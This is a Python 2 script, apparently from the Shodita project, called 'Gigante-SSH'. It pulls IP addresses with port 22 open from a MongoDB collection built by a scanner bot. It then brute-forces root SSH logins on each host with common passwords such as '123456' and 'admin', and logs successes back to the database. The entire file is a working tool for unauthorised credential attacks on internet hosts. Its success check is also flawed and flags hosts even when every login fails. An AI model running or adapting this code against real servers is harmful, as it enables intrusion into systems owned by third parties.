#!/usr/bin/python  
''' 
Copyright (C) 2016  QuantiKa14 Servicios Integrales S.L
This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.
This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.
You should have received a copy of the GNU General Public License
along with this program.  If not, see <http://www.gnu.org/licenses/>.
'''
#############################################
#AUTHOR: JORGE WEBSEC                      ##
#TWITTER: @JORGEWEBSEC                     ##
#BLOG: BOTENTRIANA.WORDPRESS.COM           ##
#EMAIL: JORGE@QUANTIKA14.COM               ##
#############################################
#***********BOT PRINCIPAL******************##
#BOT NAME: GIGANTE-SSH                     ##
#BOT ENCARGADO DE COMPROBAR LAS            ##
#DE ACCESO A SSH POR FUERZA BRUTA          ##
#############################################
import paramiko
import time, sys, os, socket
from pymongo import MongoClient

client = MongoClient()
db = client.test

#passwords = ["123456", "root", "admin", "12345", "1234", "password", "qwerty", "1234567", "welcome", "qwerty", "football", "baseball", "1234567890", "anonymous", "abc123"]
passwords = ["123456", "root", "admin", "12345"]

class colores:
    HEADER = '\033[95m'
    azul = '\033[94m'
    verde = '\033[92m'
    alerta = '\033[93m'
    FAIL = '\033[91m'
    normal = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

def insert_mongodb(IP):
	try:
		date_Insert = time.strftime("%H:%M:%S")
		date_Update = "none"
		cursor = db.Shodita.insert({"ip":IP, "date_insert": date_Insert, "date_Update": date_Update, "ssh_BF":"ok", "bot":"Gigante-ssh"})
		print "[INFO] INSERT IN DB"
	except:
		print "[WARNING]ERROR INSERT MONGODB"

def get_target():
	global client, db
	cursor = db.Shodita.find({"port":22, "bot":"Nobita"})
	for document in cursor:
		if check_ip_mongodb(document["ip"]):
			print colores.azul + "[*][TARGET]" + document["ip"] + " target already insert in DB" + colores.normal
		else:
			check_sshBF(document["ip"])

def check_ip_mongodb(ip):
	global client, db
	if db.Shodita.find({"ip":ip, "bot": "Gigante-ssh"}).count() >= 1:
		return True
	else:
		return False

def check_sshBF(ip):
	print colores.HEADER + "[*][TARGET] SSH connect to " + ip + colores.normal
	paramiko.util.log_to_file("filename.log")
	fail = 0
	user="root"
	for p in passwords:
		ssh = paramiko.SSHClient()
		starttime=time.clock()
		ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
		try:
			print colores.verde + "|----[INFO] Try user: root password: " + p + colores.normal
			ssh.connect(ip, username=user, password=p, timeout=10)
		except paramiko.AuthenticationException, error:
			print "|----[ERROR] incorrect password... root@" + ip + ":" + p
			continue
		except socket.error, error:
			fail += 1
			print error
			continue
		except paramiko.SSHException, error:
			fail += 1
			print error
			print "|----[ERROR]Most probably this is caused by a missing host key"
			continue
		except Exception, error:
			fail += 1
			print "|----[ERROR]Unknown error: " + str(error)
			continue    
		except:
			fail += 1
		ssh.close()
	if fail == 0:
		print colores.FAIL + "|----[INFO] " + ip + " has a brute force vulnerability in SSH..." + colores.normal
		insert_mongodb(ip)
	else:
		print colores.verde + "|----[INFO] " + ip + " is protected..." + colores.normal

def main():
	get_target()

if __name__ == '__main__':  
	main()
